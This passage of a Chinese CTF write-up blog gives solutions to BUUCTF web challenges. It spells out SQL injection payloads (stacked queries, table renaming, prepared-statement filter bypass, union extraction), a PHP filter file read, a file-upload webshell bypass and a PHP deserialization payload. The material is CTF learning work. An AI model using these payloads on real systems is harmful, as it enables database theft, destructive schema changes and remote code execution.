src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021423318.png 2x" sizes=auto alt=image.png></a></figure></p><p>这道题目需要我们去对后端语句进行猜测, 有点矛盾的地方在于其描述的功能和实际的功能似乎并不相符, 通过输入非零数字得到的回显1和输入其余字符得不到回显来判断出内部的查询语句可能存在有 ||, 也就是 <code>select 输入的数据||内置的一个列名 from 表名</code>, 进一步进行猜测即为 <code>select post 进去的数据||flag from Flag</code> (含有数据的表名, 通过堆叠注入可知), 需要注意的是, 此时的 || 起到的作用是 or 的作用.</p><pre tabindex=0><code>sql = &#34;select $_POST[&#39;query&#39;] || flag from Flag&#34;;
</code></pre><p>看到 <code>||</code> 想到了之前命令执行的 payload</p><pre tabindex=0><code>cmd1 || cmd2 # 如果 cmd1 正常执行就不会执行 cmd2
</code></pre><h3 id=法1 class=headerLink><a href=#%e6%b3%951 class=header-mark></a>法1</h3><p>payload：<code>*,1</code></p><p>拼接进内部语句就是</p><pre tabindex=0><code>select *,1 || flag from Flag;
</code></pre><p>把语句分开看, 逗号前面是 <code>*</code>, 而逗号后面的 <code>1 || flag</code> 是一个整体, 这个整体返回的就是 <code>true</code>
这就类似于平常查表的时候执行 <code>select name,age from students</code>, 通过逗号来查询多个字段
为啥是 <code>*,1</code> 而不能是 <code>1,*</code>? 后者在 mysql 里执行会报错</p><p><code>* || flag</code> 本身就是个错误的写法, 通配符无法表示真假性
最后再说一下, payload 的关键点在于 <code>*</code>, 而后面的数字不影响执行的结果, 改成其它值也是可以的</p><h3 id=法2 class=headerLink><a href=#%e6%b3%952 class=header-mark></a>法2</h3><p>payload：<code>1;set sql_mode=pipes_as_concat;select 1</code></p><p>这是在已经知道了 SQL 语句中含有 <code>||</code> 的前提下, 通过更改 mysql 的配置来改变 <code>||</code> 的功能
光看单词也很容易理解, 将 <code>||</code> 功能从逻辑运算符更改为拼接字符串</p><pre tabindex=0><code>mysql&gt; set sql_mode=pipes_as_concat;
Query OK, 0 rows affected (0.00 sec)

mysql&gt; select 1||2||3||4||5;
+---------------+
| 1||2||3||4||5 |
+---------------+
| 12345         |
+---------------+
1 row in set (0.00 sec)
</code></pre><p>这样之后执行 <code>select 1 || flag from Flag</code> 的时候, 也会把 flag 显示出来 (拼接)</p><h2 id=强网杯-2019随便注 class=headerLink><a href=#%e5%bc%ba%e7%bd%91%e6%9d%af-2019%e9%9a%8f%e4%be%bf%e6%b3%a8 class=header-mark></a>[强网杯 2019]随便注</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021438978.png 2x" sizes=auto alt=image.png></a></figure>联合查询时发现过滤，用堆叠注入看看
<code>1';show tables;</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021439213.png 2x" sizes=auto alt=image.png></a></figure>猜测在 1919810931114514 表中</p><pre tabindex=0><code>1&#39;;show columns from `1919810931114514`;
</code></pre><p>果然发现 flag 字段<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021440025.png 2x" sizes=auto alt=image.png></a></figure></p><h3 id=法1handler class=headerLink><a href=#%e6%b3%951handler class=header-mark></a>法1——handler</h3><p>利用 handler 函数，这个函数可以在不知道字段名的前提下查询出字段的值</p><pre tabindex=0><code>1&#39;;handler `1919810931114514` open as aaa;handler aaa read first;
</code></pre><p>其中的aaa为我们自己定义的名字，first为读第一行数据，与他并列的还有next（读取下一行)。</p><p>使用handler 读取数据 这个handler只能一行一行的读取使用read first、next、prev、last等函数去读取，用法为：</p><pre tabindex=0><code>1.打开表 handler table_name open 
2.读取第一行 handler table_name read first或者(next) 
3.关闭表 handler table_name close
</code></pre><p>所以其实对于这道题也可以不取别名直接使用：</p><pre tabindex=0><code>1&#39;;handler `1919810931114514` open;handler `1919810931114514` read next;
</code></pre><h3 id=法2rename class=headerLink><a href=#%e6%b3%952rename class=header-mark></a>法2——rename</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>1&#39;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>rename命令用于修改表名。
</span></span><span class=line><span class=cl>rename命令格式：rename table 原表名 to 新表名;
</span></span></code></pre></div><p>这道题select被过滤了，意味着这道题无法联合（union）注入，而它的内部查询语句为：</p><pre tabindex=0><code>select id,data from word where id =
</code></pre><p>网页的回显都是words这个表给的回显，而我们的flag放在数字表里，那么我们需要让数字表回显出来flag了，这时直接堆叠注入只会有words表的回显，这里的解决办法便是把数字表改为words表名。</p><pre tabindex=0><code>1.先对words进行改表名防止重名：rename table `words` to `word`;
2.将数字表改为words表名(在窗口回显内容)：rename table `1919810931114514` to `words`;
3.我们查表结构时看到words里有两个字段id列和数据data,但数字表没有id，所以我们把flag换成id：alter table `words` change `flag` `id` varchar(100);
</code></pre><p>如果修改flag为id直接堆叠：</p><pre tabindex=0><code>1&#39;;rename table `words` to `word`;rename table `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(100);#
</code></pre><p>然后用万能密码即可显示出表里的所有数据，自然也包括flag了。</p><h3 id=法3预处理 class=headerLink><a href=#%e6%b3%953%e9%a2%84%e5%a4%84%e7%90%86 class=header-mark></a>法3——预处理</h3><p>当然除了这种方法还可以使用预处理解决，如：</p><pre tabindex=0><code>1&#39;; Set @a=concat(&#34;sele&#34;,&#34;ct flag from `1919810931114514`&#34;);prepare h from @a;execute h;
</code></pre><p>预处理基于三个SQL语句：</p><pre tabindex=0><code>PREPARE stmt_name FROM preparable_stmt;
EXECUTE stmt_name [USING @var_name [, @var_name] ...];
{DEALLOCATE | DROP} PREPARE stmt_name;
</code></pre><p>PREPARE语句用于预备一个语句，并赋予它名称stmt_name，借此在以后引用该语句。语句名称对案例不敏感。preparable_stmt可以是一个文字字符串，也可以是一个包含了语句文本的用户变量。该文本必须展现一个单一的SQL语句，而不是多个语句。使用本语句，‘?’字符可以被用于制作参数，以指示当您执行查询时，数据值在哪里与查询结合在一起。‘?’字符不应加引号，即使您想要把它们与字符串值结合在一起，也不要加引号。参数制作符只能被用于数据值应该出现的地方，不用于SQL关键词和标识符等。</p><p>当然我们只用掌握它的运用即可，即：</p><pre tabindex=0><code>Set @a=&#39;语句&#39;;prepare h from @a;execute h;
</code></pre><h2 id=极客大挑战-2019lovesql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019lovesql class=header-mark></a>[极客大挑战 2019]LoveSQL</h2><pre tabindex=0><code>看字段数量
1&#39; order by 3
判断回显位
1&#39; union select 1,2,3#
看数据库
1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata#
看表
1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;geek&#39;#
看字段
1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#
看数据
1&#39; union select 1,2,group_concat(username,password) from geek.l0ve1ysq1#
</code></pre><h2 id=极客大挑战-2019secret class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019secret class=header-mark></a>[极客大挑战 2019]Secret</h2><p>一层层套娃，最后抓包得到 <code>secr3t.php</code><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021514875.png 2x" sizes=auto alt=image.png></a></figure><code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p><h2 id=极客大挑战-2019http class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019http class=header-mark></a>[极客大挑战 2019]Http</h2><p>Referer UA X-Forwarded-For<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021522901.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=极客大挑战-2019upload class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019upload class=header-mark></a>[极客大挑战 2019]Upload</h2><p>后缀为黑名单过滤, 同时检测了文件头和文件内容</p><p>文件内容不能包含 <code>&lt;?</code>, 使用 script 标签绕过<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021631544.png 2x" sizes=auto alt=image.png></a></figure>蚁剑链接</p><h2 id=极客大挑战-2019knife class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019knife class=header-mark></a>[极客大挑战 2019]Knife</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021633963.png 2x" sizes=auto alt=image.png></a></figure>直接蚁剑一把梭</p><h2 id=actf2020-新生赛upload class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bupload class=header-mark></a>[ACTF2020 新生赛]Upload</h2><p>黑名单，后缀改为 phtml<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021639465.png 2x" sizes=auto alt=image.png></a></figure></p><h2 id=极客大挑战-2019babysql class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019babysql class=header-mark></a>[极客大挑战 2019]BabySQL</h2><p>过滤 or union select where from ，双写绕过</p><pre tabindex=0><code>查找回显位
1&#39; uunionnion sselectelect 1,2,3#
看数据库
1&#39; ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#
看表
1&#39; ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;ctf&#39;#
看字段
1&#39; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;Flag&#39;#
看数据
1&#39; ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag#
</code></pre><h2 id=极客大挑战-2019php class=headerLink><a href=#%e6%9e%81%e5%ae%a2%e5%a4%a7%e6%8c%91%e6%88%98-2019php class=header-mark></a>[极客大挑战 2019]PHP</h2><p>www.zip 下载源码</p><p>index.php<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710710.png 2x" sizes=auto alt=image.png></a></figure></p><p>class.php<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021710451.png 2x" sizes=auto alt=image.png></a></figure>反序列化绕过<code> __wakeup</code></p><pre tabindex=0><code>&lt;?php  
  
class Name{  
    private $username = &#39;admin&#39;;  
    private $password = &#39;100&#39;;  
}  
  
//将属性值增大以绕过 __wakeup，并且因为private属性有不可见字符，所以将整串字符串进行urlencode  
echo urlencode(serialize(new Name()));
</code></pre><p>payload：</p><pre tabindex=0><code>?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D
</code></pre><h2 id=actf2020-新生赛backupfile class=headerLink><a href=#actf2020-%e6%96%b0%e7%94%9f%e8%b5%9bbackupfile class=header-mark></a>[ACTF2020 新生赛]BackupFile</h2><p>下载 index.php.bak</p><pre tabindex=0><code>&lt;?php
include_once &#34;flag.php&#34;;

if(isset($_GET[&#39;key&#39;])) {
    $key = $_GET[&#39;key&#39;];
    if(!is_numeric($key)) {
        exit(&#34;Just num!&#34;);
    }
    $key = intval($key);
    $str = &#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&#34;;
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo &#34;Try to find out source file!&#34;;
}
</code></pre><p>弱类型比较
<code>?key=123</code></p><h2 id=roarctf-2019easy-calc class=headerLink><a href=#roarctf-2019easy-calc class=header-mark></a>[RoarCTF 2019]Easy Calc</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021724711.png 2x" sizes=auto alt=image.png></a></figure>calc.php<figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png title=image.png data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202412021725593.png 2x" sizes=auto alt=image.png></a></figure></p></div><h2>相关内容</h2><div class=related-container><div class=related-item-container><h2 class=related-title><a href=/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/>Ctfshow做题记录</a></h2></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2021-1212-212</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><button title="分享到 Twitter" data-sharer=twitter data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录 data-hashtags=buuctf,wp><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer=facebook data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-hashtag=buuctf><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 WhatsApp" data-sharer=whatsapp data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录 data-web><span class="fab fa-whatsapp fa-fw"></span></button><button title="分享到 Line" data-sharer=line data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录><span data-svg-src=/lib/simple-icons/icons/line.min.svg></span></button><button title="分享到 微博" data-sharer=weibo data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Myspace" data-sharer=myspace data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录 data-description><span data-svg-src=/lib/simple-icons/icons/myspace.min.svg></span></button><button title="分享到 Blogger" data-sharer=blogger data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录 data-description><span class="fab fa-blogger fa-fw"></span></button><button title="分享到 Evernote" data-sharer=evernote data-url=https://nexuzzz0.github.io/posts/wp/buuctf%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ data-title=Buuctf做题记录><span class="fab fa-evernote fa-fw"></span></button></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/buuctf/>buuctf</a>,&nbsp;<a href=/tags/wp/>wp</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/wp/ctfshow%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ class=prev rel=prev title=Ctfshow做题记录><i class="fas fa-angle-left fa-fw"></i>Ctfshow做题记录</a></div></div><div id=comments></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2023 - 2024</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div><div class=footer-line></div><div class=footer-line></div></div></footer></div><div id=fixed-buttons><a href=#back-to-top id=back-to-top-button class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw"></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw"></i></a></div><div class=assets><link rel=stylesheet href=/lib/katex/katex.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/katex/copy-tex.min.css><noscript><link rel=stylesheet href=/lib/katex/copy-tex.min.css></noscript><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{},data:{"desktop-header-typeit":"Nexuzzz0's BLOG","mobile-header-typeit":"Nexuzzz0's BLOG"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1},search:{distance:100,findAllMatches:!1,highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!1,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.3,useExtendedSearch:!1},sharerjs:!0,table:{sort:!0},typeit:{cursorChar:"|",cursorSpeed:1e3,data:{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},duration:-1,speed:100}}</script><script type=text/javascript src=/lib/tablesort/tablesort.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript src=/lib/typeit/typeit.min.js></script><script type=text/javascript src=/lib/katex/katex.min.js defer></script><script type=text/javascript src=/lib/katex/auto-render.min.js defer></script><script type=text/javascript src=/lib/katex/copy-tex.min.js defer></script><script type=text/javascript src=/lib/katex/mhchem.min.js defer></script><script type=text/javascript src=/js/katex.min.js defer></script><script type=text/javascript src=/js/theme.min.js defer></script></div></body></html>